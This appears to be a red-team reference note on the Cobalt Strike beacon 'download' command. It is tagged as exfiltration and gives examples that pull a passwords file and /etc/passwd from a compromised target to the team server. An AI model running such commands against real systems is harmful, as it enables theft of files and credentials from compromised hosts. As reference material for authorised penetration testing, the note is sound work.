---
type: command
executor: beacon
data: beacon > download $_REMOTE_PATH
tags:
  - cobalt-strike
  - file-management
  - exfiltration
platforms:
  - Windows
  - Linux
verified: true
validated: true
---

# cobalt-strike-download-file

## Command

```bash
beacon > download $_REMOTE_PATH
```

## Description

Downloads a file from the target to the Cobalt Strike team server for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_REMOTE_PATH | Path to the file on the target (e.g., C:\\secrets.txt). | Yes |

## Examples

### Basic Usage

```bash
beacon > download C:\\Users\\admin\\Documents\\passwords.txt
```

### Advanced Usage

```bash
beacon > download /etc/passwd
```

## Expected Output

Download initiation with ID, e.g.:

[*] Download started [id: 1] C:\\Users\\admin\\Documents\\passwords.txt

## Related

- [[procedures/Cobalt-Strike-File-Management]]
- [[tools/Cobalt-Strike]]
